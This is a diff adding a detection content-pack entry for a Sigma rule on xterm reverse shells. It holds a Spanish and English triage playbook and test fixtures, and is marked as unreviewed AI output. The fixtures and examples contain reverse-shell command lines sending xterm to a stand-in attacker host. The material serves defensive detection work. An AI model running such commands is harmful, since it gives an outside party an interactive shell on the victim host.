@@ -1,0 +1,132 @@
+{
+  "rule": {
+    "id": "4e25af4b-246d-44ea-8563-e42aacab006b",
+    "title": "Potential Xterm Reverse Shell",
+    "level": "medium",
+    "status": "test",
+    "author": "@d4ns4n_",
+    "path": "linux/process_creation/proc_creation_lnx_xterm_reverse_shell.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/linux/process_creation/proc_creation_lnx_xterm_reverse_shell.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó xterm con la opción -display apuntando a un display :1, un patrón típico de reverse shell en el que la terminal se abre en un servidor X controlado por un atacante.",
+      "what_it_detects": "Eventos de creación de procesos en Linux donde Image contiene 'xterm', CommandLine contiene '-display' y termina en ':1', por ejemplo 'xterm -display 203.0.113.10:1'.",
+      "why_it_matters": "Con esta técnica, el atacante levanta un servidor X (por ejemplo Xnest :1) en su equipo y escucha en TCP 6001. El host víctima le abre una shell interactiva gráfica. Corresponde a ejecución mediante intérprete de comandos (ATT&CK T1059).",
+      "triage_steps": [
+        "Revise CommandLine y extraiga el host antes de ':1'. Si es una IP o dominio externo, o no forma parte de la infraestructura conocida, trátelo como sospechoso.",
+        "Identifique ParentImage y ParentCommandLine. Que el padre sea un servidor web, un intérprete (php, python, perl), cron o un servicio no interactivo indica explotación.",
+        "Confirme qué usuario lanzó el proceso y si ese usuario suele tener sesiones gráficas o acceso por VNC.",
+        "Busque en los logs de red o firewall conexiones salientes al puerto TCP 6001 hacia el host extraído, en una ventana de +/- 15 minutos.",
+        "Revise los procesos hijos de xterm (bash, sh, wget, curl, nc) y los comandos ejecutados después en el mismo host.",
+        "Busque alertas previas del mismo host, usuario o IP destino, en especial alertas web o de explotación de servicios."
+      ],
+      "false_positives": [
+        "Usuarios o scripts que abren xterm en un display local :1 legítimo, como un servidor VNC o Xvfb configurado en :1.",
+        "Administradores que redirigen xterm a la estación de trabajo de un colega dentro de la red interna, con una configuración X11 heredada.",
+        "Pruebas autorizadas de penetración o ejercicios de red team."
+      ],
+      "response_steps": [
+        "Valide con el dueño del sistema o el usuario si la ejecución estaba prevista. Documente el destino y el proceso padre.",
+        "Si no está autorizada, aísle el host o bloquee la salida hacia la IP destino y el puerto 6001. Luego termine el proceso xterm y sus hijos.",
+        "Determine el vector inicial (servicio web, credenciales comprometidas) y elimine la persistencia que encuentre: cron, claves SSH, servicios o binarios nuevos.",
+        "Rote las credenciales del usuario afectado, aplique parches al servicio vulnerable y bloquee el tráfico X11 saliente (TCP 6000-6063) en el perímetro."
+      ],
+      "severity_rationale": "El nivel medium corresponde: el patrón es muy característico de una reverse shell, pero un display local :1 legítimo también puede generar la alerta."
+    },
+    "en": {
+      "summary": "xterm was run with -display pointing to a :1 display. This is a common reverse shell pattern where the terminal opens on an X server the attacker controls.",
+      "what_it_detects": "Linux process creation events where Image contains 'xterm', CommandLine contains '-display' and ends with ':1', for example 'xterm -display 203.0.113.10:1'.",
+      "why_it_matters": "The attacker runs an X server such as Xnest :1 and listens on TCP 6001. The victim host then gives them an interactive graphical shell. This is execution through a command interpreter (ATT&CK T1059).",
+      "triage_steps": [
+        "Read CommandLine and pull out the host before ':1'. Treat it as suspicious if it is an external IP or domain, or is not known infrastructure.",
+        "Check ParentImage and ParentCommandLine. A web server, an interpreter (php, python, perl), cron or a non-interactive service as the parent suggests exploitation.",
+        "Confirm which user started the process and whether that user normally has graphical or VNC sessions.",
+        "Look in network or firewall logs for outbound TCP 6001 connections to the extracted host within +/- 15 minutes.",
+        "Review child processes of xterm (bash, sh, wget, curl, nc) and the commands run afterwards on the same host.",
+        "Look for earlier alerts on the same host, user or destination IP, especially web or service exploitation alerts."
+      ],
+      "false_positives": [
+        "Users or scripts opening xterm on a legitimate local :1 display, such as a VNC server or Xvfb set up on :1.",
+        "Admins sending xterm to a colleague's internal workstation through a legacy X11 setup.",
+        "Authorized penetration tests or red team exercises."
+      ],
+      "response_steps": [
+        "Ask the system owner or the user whether the run was expected. Record the destination and the parent process.",
+        "If it was not authorized, isolate the host or block outbound traffic to the destination IP and port 6001. Then kill xterm and its children.",
+        "Find the initial vector, such as a web service or stolen credentials. Remove any persistence you find: cron jobs, SSH keys, services or new binaries.",
+        "Rotate the affected user's credentials, patch the vulnerable service and block outbound X11 (TCP 6000-6063) at the perimeter."
+      ],
+      "severity_rationale": "Medium fits because the pattern is a strong sign of a reverse shell, but a legitimate local :1 display can also trigger it."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "A web server's PHP worker starts xterm and sends its display to an external host on display :1 (TCP 6001).",
+        "event": {
+          "Image": "/usr/bin/xterm",
+          "CommandLine": "xterm -display 203.0.113.45:1",
+          "ParentImage": "/bin/sh",
+          "ParentCommandLine": "sh -c xterm -display 203.0.113.45:1",
+          "User": "www-data",
+          "ProcessId": 48213,
+          "ParentProcessId": 48210,
+          "Computer": "web-02"
+        }
+      },
+      {
+        "description": "A user runs xterm with the -display option pointing to a remote host name on display :1.",
+        "event": {
+          "Image": "/usr/bin/xterm",
+          "CommandLine": "/usr/bin/xterm -bg black -display attacker.example.com:1",
+          "ParentImage": "/usr/bin/bash",
+          "ParentCommandLine": "bash -i",
+          "User": "jperez",
+          "ProcessId": 9921,
+          "ParentProcessId": 9800,
+          "Computer": "bastion-01"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "A normal xterm on the local display :0. The command line does not end with ':1'.",
+        "event": {
+          "Image": "/usr/bin/xterm",
+          "CommandLine": "xterm -display :0",
+          "ParentImage": "/usr/bin/xfce4-session",
+          "ParentCommandLine": "xfce4-session",
+          "User": "jperez",
+          "ProcessId": 3311,
+          "ParentProcessId": 2050,
+          "Computer": "WS-0142"
+        }
+      },
+      {
+        "description": "xterm over SSH X11 forwarding on localhost:10.0. It ends with '.0', not ':1'.",
+        "event": {
+          "Image": "/usr/bin/xterm",
+          "CommandLine": "xterm -display localhost:10.0",
+          "ParentImage": "/usr/bin/bash",
+          "ParentCommandLine": "-bash",
+          "User": "mrodriguez",
+          "ProcessId": 7710,
+          "ParentProcessId": 7702,
+          "Computer": "bastion-01"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:13+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
